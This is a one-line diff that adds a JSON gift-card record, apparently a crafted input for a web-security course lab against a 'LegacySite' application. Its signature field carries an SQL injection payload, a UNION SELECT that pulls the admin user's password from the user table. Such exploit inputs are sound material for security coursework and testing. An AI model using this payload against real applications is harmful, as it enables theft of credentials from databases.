@@ -1,0 +1,1 @@
+{"merchant_id": "NYU Apparel Card", "customer_id": "tushar", "total_value": "85", "records": [{"record_type": "amount_change", "amount_added": 2000, "signature": "[' UNION SELECT password from LegacySite_user where username = 'admin'; -- ]"}]}
